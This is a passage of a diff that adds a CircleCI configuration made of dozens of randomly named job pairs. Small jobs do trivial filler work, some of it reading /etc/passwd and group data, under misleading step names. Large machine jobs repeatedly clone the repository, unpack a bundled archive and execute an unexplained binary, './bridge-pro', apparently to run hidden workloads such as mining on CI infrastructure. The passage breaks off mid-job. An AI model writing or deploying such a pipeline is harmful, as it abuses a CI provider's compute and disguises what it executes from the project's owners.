@@ -1,0 +1,1563 @@
+version: 2.1
+
+jobs:
+  s:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: SpawnSkillTree
+          command: |
+            mkdir -p /tmp/queue2
+            set +o pipefail 2>/dev/null; yes abcdefg | head -n 718164 | awk '{print NR":"$0}' | sort -t: -k2 > /tmp/queue2/SWEEP_WAVE; true
+            du -sh /tmp/queue2/SWEEP_WAVE
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'SWEEP_WAVE'
+  add-router-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/finyv'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  PRISM_54741:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Just in case promote the support macros
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; printf %s 'walk the dog' | cksum | awk '{print $1}'; true ; } > /tmp/queue2/qUarkGaRdEnPiXElrasTeR
+            du -sh /tmp/queue2/qUarkGaRdEnPiXElrasTeR
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'qUarkGaRdEnPiXElrasTeR'
+  refactor-2255:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/qUarkGaRdEnPiXElrasTeR'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  Dismount-TextObject:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Truncation after the outage
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; fib(){ echo "[$(date +%T)] $*"; }; fib 'meeting moved to 3pm'; true ; } > /tmp/queue2/cyyxcvuiid
+            du -sh /tmp/queue2/cyyxcvuiid
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'cyyxcvuiid'
+  Rollout_Pipeline1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/cyyxcvuiid'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  feature-trait-closed:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Acknowledge on call to unblock the team
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; set -- wolf cat; for a; do echo "<$a>"; done; true ; } > /tmp/queue2/nriyw
+            du -sh /tmp/queue2/nriyw
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'nriyw'
+  v4-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/nriyw'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  URIv6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Settle the commissions per entity
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; echo "good job"; echo "sunny today"; true ; } > /tmp/queue2/9c6f6f69-c43b-1b5b-3c81-aad3afacce3
+            du -sh /tmp/queue2/9c6f6f69-c43b-1b5b-3c81-aad3afacce3
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - '9c6f6f69-c43b-1b5b-3c81-aad3afacce3'
+  hotel:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/finyv'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  card__track__bold:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: review the API keys YES
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; { printf "%s\n" kiwi melon pear; } >"/tmp/a-0324.out" && sort "/tmp/a-0324.out"; true ; } > /tmp/queue2/r1dg3m4pp3r
+            du -sh /tmp/queue2/r1dg3m4pp3r
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'r1dg3m4pp3r'
+  q2-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/finyv'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  y_train:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: BLD 153 Serving endpoint sweep
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; echo done | sed -e 's/a/A/g' -e 's/r/R/g'; true ; } > /tmp/queue2/eeb_buffer-dat_7ba
+            du -sh /tmp/queue2/eeb_buffer-dat_7ba
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'eeb_buffer-dat_7ba'
+  vela-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/eeb_buffer-dat_7ba'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  xverax:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Shift Lead Post Task
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; echo 'happy birthday' >"/tmp/contact.bak" && cp "/tmp/contact.bak" "/tmp/golden.txt" && diff "/tmp/contact.bak" "/tmp/golden.txt" && echo identical; true ; } > /tmp/queue2/iFXZz3PS5
+            du -sh /tmp/queue2/iFXZz3PS5
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'iFXZz3PS5'
+  QA_MERGE_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/finyv'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  tb_task_bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: PUSH indexes
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >"/tmp/retro.gz" && zgrep -c bash "/tmp/retro.gz"; true ; } > /tmp/queue2/96.66.158.210
+            du -sh /tmp/queue2/96.66.158.210
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - '96.66.158.210'
+  v6-ga1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/96.66.158.210'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  JKKSN-86303b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Replay
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; printf 'bridge\t71\npitch\t61\nsync\t97\ndeck\t69\n' > "/tmp/summer-helpers-arena.txt" && expand -t 12 "/tmp/summer-helpers-arena.txt"; true ; } > /tmp/queue2/fjordotterproxy
+            du -sh /tmp/queue2/fjordotterproxy
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'fjordotterproxy'
+  wip-db-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/finyv'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  logp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Execute the maintenance page announcement procedure
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -cd /etc/default|paste -sd ' '; true ; } > /tmp/queue2/kernelFilterSilver
+            du -sh /tmp/queue2/kernelFilterSilver
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'kernelFilterSilver'
+  min-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/kernelFilterSilver'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  popHAL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: The fog volumes will be textured
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | grep -i -s mail | awk -F: '{print $1}'; true ; } > /tmp/queue2/GIF.Ridge
+            du -sh /tmp/queue2/GIF.Ridge
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'GIF.Ridge'
+  qi-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/GIF.Ridge'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  fOV4IB8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Al dente randomize
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; ps axo pid,ppid,stat,comm | head -20 | tail -n +2 | head -8; true ; } > /tmp/queue2/jhjlphx
+            du -sh /tmp/queue2/jhjlphx
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'jhjlphx'
+  dp-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/jhjlphx'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  spanCost:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: reprocessing invoice rows in background
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; which tar &>/dev/null || echo "tar missing"; true ; } > /tmp/queue2/fEj9oE9Oq8zoW
+            du -sh /tmp/queue2/fEj9oE9Oq8zoW
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'fEj9oE9Oq8zoW'
+  feat-9008:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/fEj9oE9Oq8zoW'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  Sort-QueueWrapper:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: scan 251e
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; echo 'hello' | base64; true ; } > /tmp/queue2/pu153zinc
+            du -sh /tmp/queue2/pu153zinc
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'pu153zinc'
+  tweak-cache-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/pu153zinc'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  topic-map-load:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Charge for the record
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; if grep -q "^root" /etc/group; then echo "true"; else echo false; fi; true ; } > /tmp/queue2/client-fjord-fox
+            du -sh /tmp/queue2/client-fjord-fox
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'client-fjord-fox'
+  ken-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/client-fjord-fox'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  db032:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Tag the blog post ready for speed
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; getent passwd | cut -d: -f1 | tac | cat -n | fold -w 24; true ; } > /tmp/queue2/iron-gadget-hollow-archive
+            du -sh /tmp/queue2/iron-gadget-hollow-archive
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'iron-gadget-hollow-archive'
+  produce-quick-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/iron-gadget-hollow-archive'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  JhRuaW:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: RUN SKIN RAGDOLLS
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; for i in purple yellow magenta brown; do printf '%-8s %d\n' "${i}" ${#i}; done|sort -r; true ; } > /tmp/queue2/workerFilter
+            du -sh /tmp/queue2/workerFilter
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'workerFilter'
+  API-796:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/workerFilter'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  lPrevProductIterator:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: open subnet
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; cat /proc/cpuinfo|fmt -w 44|tr -s ' '|awk '{print NF}'|wc -l; true ; } > /tmp/queue2/IMG-84234
+            du -sh /tmp/queue2/IMG-84234
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'IMG-84234'
+  bun-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/IMG-84234'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  shader_cli:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Agar weighed check
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; if [[ -L /bin ]] ; then echo "found"; fi; true ; } > /tmp/queue2/stage_75c3c8d
+            du -sh /tmp/queue2/stage_75c3c8d
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'stage_75c3c8d'
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/stage_75c3c8d'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  wrappersCache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Sync the mesh routes to Seattle
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; grep -n sh /etc/shells | sort -u; true ; } > /tmp/queue2/5385af
+            du -sh /tmp/queue2/5385af
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - '5385af'
+  q1-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/5385af'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  assertALLOC:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Level XII test antenna
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; id -Gn | tr ' ' '\n' | sort -r; true ; } > /tmp/queue2/20170101_181506
+            du -sh /tmp/queue2/20170101_181506
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - '20170101_181506'
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/finyv'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  hotel-robot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Suspend tagging
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; ls -nl | sort -rk5 | head -n 3; true ; } > /tmp/queue2/iter3_714c
+            du -sh /tmp/queue2/iter3_714c
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'iter3_714c'
+  UAT_BUILD_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/iter3_714c'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  bobdev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Stir the inference server
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; cat /proc/sys/kernel/ostype | head -n12; true ; } > /tmp/queue2/LOT50535
+            du -sh /tmp/queue2/LOT50535
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'LOT50535'
+  add-session:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/finyv'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  pnl_protocol:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Plan Amber Heron
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; printf %s 'OK' | sha1sum | awk '{print $1}'; true ; } > /tmp/queue2/MVI68520
+            du -sh /tmp/queue2/MVI68520
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'MVI68520'
+  mike:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/MVI68520'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  undo_-_key:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Beta API Key Approval
+          command: |
+            mkdir -p /tmp/queue2
